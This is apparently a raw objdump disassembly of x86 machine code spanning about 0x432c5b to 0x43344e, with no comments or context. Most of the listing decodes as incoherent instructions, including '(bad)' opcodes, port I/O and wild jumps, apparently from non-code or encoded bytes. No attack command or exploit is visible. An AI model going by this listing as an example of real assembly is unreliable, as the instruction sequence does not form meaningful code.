  432c5b:	add    al,al
  432c5d:	mov    eax,DWORD PTR ds:0x890045a8
  432c63:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c69:	inc    DWORD PTR [eax*2+0xf75854d]
  432c70:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c76:	call   0x729989b7
  432c7b:	je     0x432cdb
  432c7d:	js     0x432cde
  432c7f:	lock ret 0x7e
  432c83:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c89:	mov    edi,edi
  432c8b:	sbb    al,bl
  432c8d:	clc    
  432c8e:	add    BYTE PTR [ebp-0x73],bh
  432c91:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c97:	ror    BYTE PTR [eax],1
  432c99:	dec    ebp
  432c9a:	xchg   ebp,eax
  432c9b:	mov    edi,edi
  432c9d:	in     al,0x8b
  432c9f:	jge    0x432c2a
  432ca1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ca7:	clc    
  432ca8:	pop    esi
  432ca9:	fist   DWORD PTR [ebp+0x5d398b5d]
  432caf:	clc    
  432cb0:	add    al,0x6e
  432cb2:	mov    eax,DWORD PTR [ebx]
  432cb4:	mov    BYTE PTR [ebp+0x0],dl
  432cb7:	mov    edx,DWORD PTR [ebx-0x20]
  432cba:	adc    esi,DWORD PTR [edi+0x5e005f3a]
  432cc0:	add    eax,0x3b3b73
  432cc5:	adc    al,0x89
  432cc7:	pop    eax
  432cc8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432ccc:	ret    0xf08
  432ccf:	cmp    al,0x2
  432cd1:	mov    DWORD PTR [edx],edi
  432cd3:	cld    
  432cd4:	add    BYTE PTR [ebp+0x66],dl
  432cd7:	add    eax,ebx
  432cd9:	add    esp,eax
  432cdb:	sub    eax,eax
  432cdd:	or     BYTE PTR [ecx-0x77f474bb],cl
  432ce3:	add    BYTE PTR [eax],al
  432ce5:	mov    DWORD PTR [ebx-0x24],ebx
  432ce8:	push   edi
  432ce9:	push   ebp
  432cea:	clc    
  432ceb:	add    DWORD PTR [esi+0x1b0100],0x45
  432cf2:	out    0xff,eax
  432cf4:	add    edx,DWORD PTR [eax]
  432cf6:	jmp    0x432ce0
  432cf8:	cmp    ch,0x45
  432cfb:	(bad)  
  432cfc:	jmp    0x40c8b54e
  432d01:	je     0x432c8d
  432d03:	mov    eax,DWORD PTR [eax-0x10c78304]
  432d09:	inc    ebp
  432d0a:	add    BYTE PTR [ebx-0x770375],al
  432d10:	add    ah,ch
  432d12:	add    edx,esp
  432d14:	pop    edi
  432d15:	pop    ebp
  432d16:	push   ebp
  432d17:	inc    ebx
  432d18:	in     al,dx
  432d19:	pop    ebp
  432d1a:	in     al,dx
  432d1b:	cmp    edx,DWORD PTR [edi-0x8]
  432d1e:	xor    eax,0x895b9c94
  432d23:	leave  
  432d24:	call   0x8998742d
  432d29:	in     al,dx
  432d2a:	in     al,0x45
  432d2c:	dec    ebp
  432d2d:	push   esi
  432d2e:	test   DWORD PTR [eax+0xfb010f],esi
  432d34:	add    BYTE PTR [eax+0xc018b],dh
  432d3a:	leave  
  432d3b:	inc    ebp
  432d3c:	test   al,ch
  432d3e:	add    dh,bh
  432d40:	add    bh,bh
  432d42:	dec    ebp
  432d43:	push   cs
  432d44:	mov    DWORD PTR [ecx],eax
  432d46:	hlt    
  432d47:	push   es
  432d48:	dec    ebp
  432d49:	leave  
  432d4a:	mov    DWORD PTR [eax],ecx
  432d4c:	clc    
  432d4d:	cmovge eax,ecx
  432d50:	mov    ecx,0x85c2f0
  432d56:	clc    
  432d57:	pop    DWORD PTR [ebp+0x1]
  432d5a:	push   ebx
  432d5b:	add    BYTE PTR [ebp-0x15],bh
  432d5e:	push   esi
  432d5f:	xor    eax,0x898a45
  432d64:	cld    
  432d65:	add    BYTE PTR [ebp+0x0],al
  432d68:	cmp    esp,DWORD PTR [esi-0x64]
  432d6b:	add    DWORD PTR [esi+0x78308c1],edi
  432d71:	add    ah,BYTE PTR [esi-0x49]
  432d74:	int    0xbb
  432d76:	mov    ecx,DWORD PTR [edi+0xc]
  432d79:	add    dh,al
  432d7b:	cmp    ecx,ebx
  432d7d:	jne    0x432d47
  432d7f:	xor    ecx,DWORD PTR [ebp+0x66]
  432d82:	jmp    0xca2d88
  432d87:	add    DWORD PTR [ebp+0x0],eax
  432d8a:	mov    eax,ebx
  432d8c:	or     al,0x8b
  432d8e:	(bad)  
  432d8f:	mov    ecx,esi
  432d91:	mov    BYTE PTR [eax+eax*1+0x664c134],cl
  432d98:	mov    eax,edi
  432d9a:	or     BYTE PTR [edx],cl
  432d9c:	shl    cl,cl
  432d9e:	icebp  
  432d9f:	add    BYTE PTR [ebp+0x39],0x8b
  432da3:	or     BYTE PTR [edx+eax*2],cl
  432da6:	(bad)  
  432da7:	or     cl,dh
  432da9:	stc    
  432daa:	shl    DWORD PTR [ebp-0x30],0xc6
  432dae:	xor    al,0x0
  432db0:	inc    ebp
  432db1:	xchg   BYTE PTR [ebx],al
  432db3:	add    esp,edi
  432db5:	add    BYTE PTR [ebp-0x39],cl
  432db8:	mov    al,bl
  432dba:	test   DWORD PTR [ebx+0x1c348375],ecx
  432dc0:	sub    al,0xbf
  432dc2:	jmp    0x432d49
  432dc4:	mov    edi,eax
  432dc6:	lock jge 0x432dba
  432dc9:	lea    esi,[edx-0x74bad501]
  432dcf:	mov    ebp,esp
  432dd1:	or     cl,dh
  432dd3:	leave  
  432dd4:	add    al,BYTE PTR [eax+eax*4-0x37ff9a00]
  432ddb:	dec    ebp
  432ddc:	dec    ebp
  432ddd:	test   DWORD PTR [ebx],eax
  432ddf:	paddb  mm6,mm0
  432de2:	add    DWORD PTR [eax],eax
  432de4:	dec    ebp
  432de5:	mov    ecx,DWORD PTR [ebx-0x65b217f0]
  432deb:	mov    esi,DWORD PTR [edx]
  432ded:	or     al,0x2b
  432def:	dec    ebp
  432df0:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432df6:	mov    esp,eax
  432df8:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432dff:	mov    DWORD PTR [ebx],ebp
  432e01:	call   0xc76b731
  432e06:	mov    DWORD PTR [ebp+0x10],ecx
  432e09:	(bad)  
  432e0a:	push   0x8b85ff10
  432e0f:	clc    
  432e10:	or     al,0x53
  432e12:	(bad)  
  432e13:	push   ecx
  432e14:	retf   
  432e15:	mov    ebx,0xff4d8dc8
  432e1a:	mov    DWORD PTR [ebp+0x8],eax
  432e1d:	xor    eax,DWORD PTR [ebp-0x75]
  432e20:	cmp    ebp,DWORD PTR [ebx]
  432e22:	lsl    ebx,WORD PTR [edi-0x8]
  432e26:	call   DWORD PTR [ebx-0x741bff75]
  432e2c:	(bad)  
  432e2d:	or     al,0x5b
  432e2f:	dec    ebp
  432e30:	or     BYTE PTR [ebx],dh
  432e32:	inc    ebp
  432e33:	xor    esi,DWORD PTR ds:0x708088d
  432e39:	in     eax,0x9a
  432e3b:	add    BYTE PTR [edx],dh
  432e3d:	inc    ebp
  432e3e:	pop    edi
  432e3f:	xor    eax,edx
  432e41:	test   DWORD PTR [eax],0x81108b8b
  432e47:	dec    ebp
  432e48:	sub    al,0x33
  432e4a:	add    BYTE PTR [ebx],dh
  432e4c:	push   esi
  432e4d:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e53:	mov    edi,eax
  432e55:	or     BYTE PTR [ebp+0x45],al
  432e58:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e5e:	xor    eax,0xc7069cc9
  432e63:	inc    ebp
  432e64:	cld    
  432e65:	cmp    DWORD PTR [ebp+0x454df817],eax
  432e6b:	cmp    BYTE PTR ds:0xc7669c53,0xd1
  432e72:	in     al,0x4d
  432e74:	xchg   BYTE PTR [eax-0x3dbaac08],al
  432e7a:	aad    0xe9
  432e7c:	xlat   BYTE PTR ds:[ebx]
  432e7d:	rol    bh,cl
  432e7f:	mov    edx,esp
  432e81:	or     BYTE PTR [ebp+0x4588f84d],al
  432e87:	mov    ecx,DWORD PTR [eax]
  432e89:	or     BYTE PTR [eax],al
  432e8b:	push   ebp
  432e8c:	mov    edi,DWORD PTR [eax+0xfc728b]
  432e92:	dec    ebp
  432e93:	enter  0xceba,0x8
  432e97:	retf   0x1807
  432e9a:	ret    0x9a4d
  432e9d:	mov    esi,DWORD PTR [edx]
  432e9f:	or     al,0x33
  432ea1:	into   
  432ea2:	add    edx,esi
  432ea4:	add    ecx,edx
  432ea6:	bswap  eax
  432ea8:	ror    esi,0x98
  432eab:	dec    ebp
  432eac:	add    cl,ch
  432eae:	mov    edi,edi
  432eb0:	hlt    
  432eb1:	inc    esi
  432eb3:	inc    ebp
  432eb4:	ret    0x4533
  432eb7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ebd:	or     BYTE PTR [ebx],dh
  432ebf:	dec    ebp
  432ec0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432ec6:	jne    0xff8d2e8d
  432ecc:	inc    ebp
  432ecd:	inc    ebp
  432ece:	mov    esi,DWORD PTR [ebx]
  432ed0:	clc    
  432ed1:	pop    esi
  432ed2:	ret    0xcaeb
  432ed5:	mov    eax,esi
  432ed7:	call   0x520482aa
  432edc:	dec    ebp
  432edd:	add    eax,0xf8728b
  432ee2:	adc    eax,0xce0ccac9
  432ee7:	push   ebp
  432ee8:	ret    0xc6ec
  432eeb:	in     al,dx
  432eec:	call   0x33437bf5
  432ef1:	push   edi
  432ef2:	add    edi,eax
  432ef4:	xor    eax,eax
  432ef6:	jmp    0x432f3d
  432ef8:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432efe:	add    eax,edi
  432f00:	shr    eax,cl
  432f02:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432f08:	mov    esi,DWORD PTR [esp+ebp*8]
  432f0b:	pushf  
  432f0c:	ret    0x84c7
  432f0f:	fcomp  DWORD PTR [edx-0x7607cd7b]
  432f15:	inc    ebp
  432f16:	in     al,dx
  432f17:	xor    eax,0xc78b9c45
  432f1c:	cld    
  432f1d:	fmul   st(2),st
  432f1f:	sbb    dl,al
  432f21:	jmp    0x9c3b:0x364d45c1
  432f28:	jbe    0x432ef1
  432f2a:	mov    esp,eax
  432f2c:	clc    
  432f2d:	add    BYTE PTR [ebp+0x0],cl
  432f30:	mov    ecx,ecx
  432f32:	lea    eax,[ebp-0x5]
  432f35:	mov    edi,edi
  432f37:	call   0x51ce8281
  432f3c:	hlt    
  432f3d:	xor    eax,edx
  432f3f:	mov    esi,0x9a7284
  432f44:	xor    cl,dl
  432f46:	mov    esi,eax
  432f48:	hlt    
  432f49:	into   
  432f4a:	inc    ebp
  432f4b:	scas   eax,DWORD PTR es:[edi]
  432f4c:	mov    ebp,ecx
  432f4e:	cld    
  432f4f:	add    dl,cl
  432f51:	add    dl,al
  432f53:	inc    ebp
  432f54:	shr    DWORD PTR [ebx],0x4d
  432f57:	xor    edi,DWORD PTR [ebx]
  432f59:	mov    DWORD PTR [edi],ecx
  432f5b:	clc    
  432f5c:	dec    esi
  432f5d:	inc    ebp
  432f5e:	dec    DWORD PTR [ebx-0x3d2b1775]
  432f64:	ret    0xc6ca
  432f67:	mov    BYTE PTR [ebp-0x32],0x53
  432f6b:	scas   eax,DWORD PTR es:[edi]
  432f6c:	inc    ebp
  432f6d:	jmp    0x432fa5
  432f6f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432f76:	pop    ebx
  432f77:	xor    ecx,DWORD PTR [ebp+0x3]
  432f7a:	mov    eax,DWORD PTR [ebx]
  432f7c:	clc    
  432f7d:	test   edx,ecx
  432f7f:	mov    ecx,esi
  432f81:	cld    
  432f82:	call   0x8ab774cc
  432f87:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432f8d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432f93:	fdiv   QWORD PTR [ebx]
  432f95:	retf   0xce89
  432f98:	in     al,0xc1
  432f9a:	inc    ebp
  432f9b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432fa1:	into   
  432fa2:	mov    dh,0xc1
  432fa5:	call   0x8c17752e
  432faa:	(bad)  
  432fab:	cld    
  432fac:	mov    ecx,DWORD PTR [ebp-0x14]
  432faf:	xor    eax,ecx
  432fb1:	lea    eax,[ebp+0x8]
  432fb4:	mov    esi,DWORD PTR [edx-0x4]
  432fb7:	add    dl,al
  432fb9:	inc    ebp
  432fba:	mov    esp,0x32d89a8b
  432fbf:	dec    ebp
  432fc0:	mov    esi,DWORD PTR [ebx]
  432fc2:	cld    
  432fc3:	xor    eax,edx
  432fc5:	sub    esp,DWORD PTR [esi-0x75]
  432fc8:	int    0xec
  432fca:	sub    ecx,eax
  432fcc:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  432fd2:	mov    esi,esp
  432fd4:	call   0x34177d5d
  432fd9:	inc    DWORD PTR [ebx]
  432fdb:	mov    edi,DWORD PTR [ebx]
  432fdd:	cld    
  432fde:	jne    0x43302d
  432fe0:	mov    esi,DWORD PTR [ebx]
  432fe2:	aam    0x8d
  432fe4:	dec    ebp
  432fe5:	or     BYTE PTR [ebx],dh
  432fe7:	jb     0x432fec
  432fe9:	add    BYTE PTR [edi+0x45],bl
  432fec:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  432ff3:	xor    ebp,esp
  432ff5:	xor    eax,edi
  432ff7:	sub    edi,esp
  432ff9:	mov    eax,DWORD PTR [ebp+0x34c8f8f4]
  432fff:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433006:	inc    ebp
  433007:	xor    ecx,DWORD PTR [ecx+0x45891403]
  43300d:	clc    
  43300e:	mov    eax,edi
  433010:	nop
  433011:	fadd   QWORD PTR [eax]
  433013:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433019:	jmp    0x432fa4
  43301b:	mov    eax,DWORD PTR [ecx]
  43301d:	fadd   DWORD PTR [eax]
  43301f:	inc    ebp
  433020:	or     DWORD PTR [ebx],esi
  433022:	dec    eax
  433023:	add    edx,DWORD PTR [ebx-0x2d]
  433026:	dec    ebp
  433027:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  43302d:	inc    ebp
  43302e:	push   ebx
  43302f:	mov    dl,BYTE PTR [ecx-0xd]
  433032:	xor    ecx,DWORD PTR [ebp-0x45]
  433035:	(bad)  
  433037:	rol    BYTE PTR [eax],0xc1
  43303a:	ret    
  43303b:	inc    ebp
  43303c:	inc    ebp
  43303d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  433043:	xor    eax,ebx
  433045:	add    eax,DWORD PTR [ebp+0x23]
  433048:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43304e:	cmp    edi,0xc
  433051:	dec    ebp
  433052:	inc    ebp
  433053:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433059:	inc    ebp
  43305a:	mov    esi,DWORD PTR [ebx]
  43305c:	clc    
  43305d:	lea    eax,[ebp+0x45725407]
  433063:	add    BYTE PTR [ebp+eax*2-0x75],dh
  433067:	xor    edi,DWORD PTR [eax]
  433069:	mov    ecx,0xff8b8d4d
  43306e:	push   esp
  43306f:	enter  0x4df7,0x23
  433073:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  433079:	mov    eax,DWORD PTR [ebx]
  43307b:	loopne 0x433068
  43307d:	ret    0xc68b
  433080:	push   esp
  433081:	enter  0x9745,0x8b
  433085:	inc    ebp
  433086:	cld    
  433087:	mov    eax,edi
  433089:	clc    
  43308a:	ret    
  43308b:	ret    0xc645
  43308e:	mov    esi,DWORD PTR [ebx]
  433090:	cld    
  433091:	pop    esi
  433092:	mov    ebx,0x83458bc3
  433098:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  43309c:	dec    ebp
  43309d:	xor    eax,0xba039c33
  4330a2:	mov    DWORD PTR [ebp+0x55d8f889],eax
  4330a8:	inc    ebp
  4330a9:	mov    edi,DWORD PTR [ebx]
  4330ab:	adc    al,0x9c
  4330ad:	inc    ebp
  4330ae:	(bad)  
  4330af:	mov    ebx,eax
  4330b1:	adc    al,0x85
  4330b3:	cmp    al,0x1
  4330b6:	inc    ebp
  4330b7:	add    BYTE PTR [ecx],bh
  4330b9:	dec    ebp
  4330ba:	pushf  
  4330bb:	mov    ebp,ecx
  4330bd:	mov    eax,DWORD PTR [ebx]
  4330bf:	nop
  4330c0:	add    BYTE PTR [eax],al
  4330c2:	inc    ebp
  4330c3:	mov    esi,DWORD PTR [ebx]
  4330c5:	add    eax,DWORD PTR [ebx]
  4330c7:	cmp    al,0x89
  4330c9:	mov    esp,esi
  4330cb:	clc    
  4330cc:	inc    ebp
  4330cd:	inc    ebp
  4330ce:	add    edx,DWORD PTR [esi+0xc]
  4330d1:	mov    edi,0x7ff0845
  4330d6:	in     al,dx
  4330d7:	(bad)  
  4330d8:	jne    0x433074
  4330da:	mov    esi,DWORD PTR [edx]
  4330dc:	clc    
  4330dd:	add    ebp,DWORD PTR [esi]
  4330df:	mov    edi,edi
  4330e1:	in     al,dx
  4330e2:	mov    DWORD PTR [ebp-0x10],eax
  4330e5:	xor    eax,DWORD PTR [ebp+0x3]
  4330e8:	cmp    eax,0x8bf49c89
  4330ed:	inc    ebp
  4330ee:	fmul   DWORD PTR [ebx-0x173caf39]
  4330f4:	lea    ecx,[ecx+0x45e8d4bc]
  4330fa:	clc    
  4330fb:	mov    edi,edi
  4330fd:	cmp    BYTE PTR [ebp+0x4d],al
  433100:	test   DWORD PTR [eax+0x74],ecx
  433103:	inc    ecx
  433104:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43310a:	ret    
  43310b:	inc    eax
  43310c:	dec    DWORD PTR [ebx+0x4945f8f0]
  433112:	push   eax
  433113:	dec    eax
  433114:	test   al,0xd0
  433116:	dec    eax
  433118:	mov    eax,DWORD PTR [ebp-0x14]
  43311b:	mov    eax,DWORD PTR [ebp+0x38]
  43311e:	mov    eax,ecx
  433120:	fadd   DWORD PTR [ebx]
  433122:	dec    ebp
  433123:	inc    eax
  433124:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43312a:	inc    ebp
  43312b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  433131:	fadd   QWORD PTR [ebx]
  433133:	inc    ebp
  433134:	or     al,0x33
  433136:	dec    ebp
  433137:	add    edi,DWORD PTR [ebx]
  433139:	mov    DWORD PTR [edx-0x28],esi
  43313c:	mov    eax,DWORD PTR [ebp-0x10]
  43313f:	mov    eax,DWORD PTR [eax+0x10]
  433142:	mov    eax,edi
  433144:	lock ret 
  433146:	inc    ecx
  433147:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43314d:	fsubr  st,st(5)
  43314f:	test   DWORD PTR [eax],eax
  433151:	clc    
  433152:	push   0x45
  433154:	(bad)  
  433155:	cmp    ch,ah
  433157:	pushf  
  433158:	inc    ebp
  433159:	(bad)  
  43315a:	push   eax
  43315b:	fsub   DWORD PTR [eax-0x7b]
  43315e:	(bad)  
  43315f:	clc    
  433160:	mov    eax,0xf8008584
  433165:	mov    eax,DWORD PTR [ebp-0x4]
  433168:	mov    edi,0x4585c3cc
  43316e:	clc    
  43316f:	mov    eax,DWORD PTR [ebp+0x14]
  433172:	cmp    eax,DWORD PTR [ebp-0x64]
  433175:	mov    edi,eax
  433177:	in     al,dx
  433178:	les    esi,FWORD PTR [ebp-0x7b]
  43317b:	mov    edi,eax
  43317d:	or     al,0x4d
  43317f:	dec    ebp
  433180:	mov    eax,ebp
  433182:	in     al,0xf2
  433184:	dec    ebp
  433185:	dec    DWORD PTR [ecx+0x4dc7e045]
  43318b:	fmul   DWORD PTR [ecx+0x4df8f085]
  433191:	inc    ebp
  433192:	mov    DWORD PTR [ebx],esi
  433194:	fadd   QWORD PTR [ebx]
  433196:	dec    ebp
  433197:	push   eax
  433198:	xor    eax,DWORD PTR [ebp+0x3]
  43319b:	push   eax
  43319c:	mov    DWORD PTR [eax+ebx*8],ebx
  43319f:	push   esi
  4331a1:	mov    eax,DWORD PTR [eax]
  4331a3:	lock cmp eax,0xf84e85c0
  4331a9:	inc    ebp
  4331aa:	test   BYTE PTR [ebx],dh
  4331ac:	add    DWORD PTR [ebx],eax
  4331ae:	add    BYTE PTR [eax+0x4d],dl
  4331b1:	jne    0x4331e6
  4331b3:	lea    ecx,[ebx-0x7617fc44]
  4331b9:	div    ah
  4331bb:	inc    DWORD PTR [ebp+0x45]
  4331be:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4331c4:	jb     0x433151
  4331c6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4331cd:	mov    ecx,DWORD PTR [ebp-0x10]
  4331d0:	xor    ecx,DWORD PTR [ebp+0x3]
  4331d3:	mov    edi,DWORD PTR [ebx]
  4331d5:	adc    BYTE PTR [ebp+0x41],dh
  4331d8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4331de:	ret    
  4331df:	push   ss
  4331e0:	push   0x45
  4331e2:	lea    ecx,[ebx+0x4de80cb0]
  4331e8:	sti    
  4331e9:	add    edi,edi
  4331eb:	or     BYTE PTR [ebp+0x4d],al
  4331ee:	mov    ebp,DWORD PTR [ebx]
  4331f0:	xor    ebp,ecx
  4331f2:	mov    al,BYTE PTR [edx]
  4331f4:	add    eax,0xc7200
  4331f9:	jne    0x433248
  4331fb:	lea    esi,[ebx]
  4331fd:	mov    al,0xf
  4331ff:	call   0xf28c4
  433204:	shl    DWORD PTR ds:0x89019c84,0x0
  43320b:	rol    BYTE PTR [ebp+0x45],1
  43320e:	mov    esi,DWORD PTR [ebx+esi*1]
  433211:	pushf  
  433212:	mov    al,bh
  433214:	add    eax,0x8572c8
  433219:	clc    
  43321a:	dec    ebp
  43321b:	inc    ebp
  43321c:	xor    edi,DWORD PTR [edx]
  43321e:	setl   al
  433221:	(bad)  
  433222:	retf   
  433223:	rol    cl,1
  433225:	dec    ebp
  433226:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43322c:	inc    ebp
  43322d:	lea    ecx,[ebx-0x75b2cc38]
  433233:	lea    eax,ds:0x4d72c4
  433239:	mov    ecx,DWORD PTR [ebp-0x4]
  43323c:	xor    ecx,edi
  43323e:	bswap  ebx
  433240:	ror    BYTE PTR [ebp-0x35],0xe9
  433244:	rol    DWORD PTR [ecx],0x84
  433247:	add    BYTE PTR [ecx],al
  433249:	cmp    eax,DWORD PTR [eax]
  43324b:	pushf  
  43324c:	inc    ebp
  43324d:	jnp    0x8a436650
  433253:	mov    eax,DWORD PTR ds:0xcf72e8
  433259:	lock dec ebp
  43325b:	retf   
  43325c:	xor    ecx,DWORD PTR [ebp+0xf]
  43325f:	mov    eax,eax
  433261:	fmul   st,st(3)
  433263:	test   ecx,0x19a8484
  433269:	xor    al,BYTE PTR [eax]
  43326b:	mov    DWORD PTR [ebp-0x28],eax
  43326e:	mov    eax,DWORD PTR [ebp+0x33]
  433271:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433277:	ret    
  433278:	add    al,cl
  43327a:	dec    ebp
  43327b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  433281:	add    ecx,DWORD PTR ds:0xc7250
  433287:	inc    ebp
  433288:	rcl    DWORD PTR [eax+0x4d],0x2b
  43328c:	mov    edi,edi
  43328e:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433294:	jb     0x43325d
  433296:	add    BYTE PTR [ecx+eax*8-0x74cdb2b6],al
  43329d:	mov    esi,DWORD PTR [ebx]
  43329f:	cld    
  4332a0:	mov    cl,bh
  4332a2:	or     eax,0x372b6
  4332a7:	cmp    ecx,eax
  4332a9:	jne    0x433326
  4332af:	mov    eax,DWORD PTR [ebp-0x20]
  4332b2:	mov    eax,DWORD PTR [eax]
  4332b4:	xor    eax,edi
  4332b6:	mov    al,BYTE PTR [ebp+eax*1+0x32724a]
  4332bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4332c0:	mov    ecx,edi
  4332c2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332c8:	jb     0x4332d9
  4332ca:	add    BYTE PTR [edi-0x3f],dl
  4332cd:	add    BYTE PTR [ebp-0x75],cl
  4332d0:	mov    esi,eax
  4332d2:	xor    eax,DWORD PTR [eax]
  4332d4:	mov    al,bh
  4332d6:	or     eax,0x4a7284
  4332db:	xor    al,cl
  4332dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4332e0:	mov    ecx,edi
  4332e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332e8:	jb     0x4332f9
  4332ea:	add    BYTE PTR [edi],dh
  4332ec:	enter  0x8500,0x8b
  4332f0:	add    ah,bl
  4332f2:	add    BYTE PTR [eax],al
  4332f4:	inc    ebp
  4332f5:	(bad)  
  4332f6:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4a]
  4332fd:	mov    esi,DWORD PTR [edx-0x4]
  433300:	add    bh,cl
  433302:	dec    ebp
  433303:	mov    dh,0x8b
  433305:	add    esi,DWORD PTR [ebx]
  433307:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43330d:	add    BYTE PTR [eax],al
  43330f:	mov    eax,ecx
  433311:	loopne 0x433360
  433313:	add    BYTE PTR [ebx-0x757bcc39],cl
  433319:	dec    edx
  43331a:	or     eax,0x8b7232
  43331f:	in     al,0xc1
  433321:	or     DWORD PTR [ebp-0x31],ecx
  433324:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4a]
  43332b:	xor    dh,BYTE PTR [edx-0x75]
  43332e:	add    al,dh
  433330:	enter  0x4f09,0xcf
  433334:	inc    ebp
  433335:	mov    WORD PTR [ebx-0x75cdccb6],cs
  43333b:	or     al,BYTE PTR ds:0xe4728b
  433341:	or     DWORD PTR [ebp-0x31],ecx
  433344:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4e]
  43334b:	cmp    dh,BYTE PTR [edx+0xf]
  43334e:	add    bl,dl
  433350:	rol    DWORD PTR [eax],0x4d
  433353:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433359:	(bad)  
  43335a:	or     eax,0x4a7284
  43335f:	xor    al,cl
  433361:	mov    ecx,DWORD PTR [ebp-0x20]
  433364:	mov    ecx,DWORD PTR [ecx]
  433366:	xor    ecx,edi
  433368:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724a]
  43336f:	xor    cl,al
  433371:	mov    ecx,DWORD PTR [edi]
  433373:	fadd   QWORD PTR [ebp+0x9]
  433376:	call   0xffd02e4a
  43337b:	dec    edx
  43337c:	dec    ebp
  43337d:	xor    bh,BYTE PTR [ebx]
  43337f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  433383:	loopne 0x433381
  433385:	or     edi,eax
  433387:	iret   
  433388:	ret    
  433389:	mov    WORD PTR [ebp+0x4e],es
  43338c:	mov    esi,DWORD PTR [edx]
  43338e:	call   0x8452facd
  433393:	(bad)  
  433394:	call   0x8bdc:0x338b3200
  43339b:	add    ah,bh
  43339d:	(bad)  
  43339e:	push   ebp
  43339f:	test   BYTE PTR [ebx],dh
  4333a1:	dec    edx
  4333a2:	add    esi,DWORD PTR [edx]
  4333a4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4333aa:	dec    edi
  4333ac:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4a]
  4333b3:	xor    al,BYTE PTR [ebx]
  4333b5:	mov    edi,DWORD PTR [ebx]
  4333b7:	in     al,0x75
  4333b9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4333bf:	dec    edx
  4333c0:	xor    esi,DWORD PTR [edx]
  4333c2:	lea    ecx,[edx]
  4333c4:	or     BYTE PTR [ebx+0x900f072],cl
  4333ca:	ja     0x43339b
  4333cc:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b2],cl
  4333d3:	cmp    ch,al
  4333d5:	jne    0x4333ca
  4333d7:	mov    edi,edi
  4333d9:	fadd   QWORD PTR [ebp+0x0]
  4333dc:	mov    eax,edi
  4333de:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb6]
  4333e5:	mov    edx,DWORD PTR [ebx]
  4333e7:	in     al,0x45
  4333e9:	or     DWORD PTR [ebx],esi
  4333eb:	iret   
  4333ec:	add    ecx,DWORD PTR [eax+edx*2+0x4532184a]
  4333f3:	xor    dl,BYTE PTR [eax-0x75]
  4333f6:	sbb    al,0xe0
  4333f8:	dec    DWORD PTR [ecx]
  4333fa:	mov    ecx,edi
  4333fc:	in     al,dx
  4333fd:	mov    eax,es
  4333ff:	dec    edx
  433400:	mov    DWORD PTR [edx],esi
  433402:	fmul   QWORD PTR [edx]
  433404:	jne    0x433391
  433406:	(bad)  
  433407:	(bad)  
  433409:	or     DWORD PTR [ebp-0x31],eax
  43340c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b2]
  433413:	cmp    bh,bh
  433415:	jne    0x43345c
  433417:	lea    ecx,[ebx-0x38372750]
  43341d:	inc    ebx
  43341f:	mov    eax,ecx
  433421:	mov    eax,0xa00c111
  433426:	jne    0x43346d
  433428:	mov    esi,DWORD PTR [ebx]
  43342a:	test   al,0x3
  43342c:	inc    ebp
  43342d:	mov    DWORD PTR [eax-0xc],edx
  433430:	loop   0x433477
  433432:	push   DWORD PTR [ebx]
  433434:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43343a:	add    DWORD PTR [eax],eax
  43343c:	mov    eax,edi
  43343e:	lods   al,BYTE PTR ds:[esi]
  43343f:	dec    ebp
  433440:	inc    ebp
  433441:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433447:	retf   
  433448:	mov    edx,ecx
  43344a:	adc    al,0x84
  43344c:	(bad)  
  43344d:	std    
  43344e:	ret    
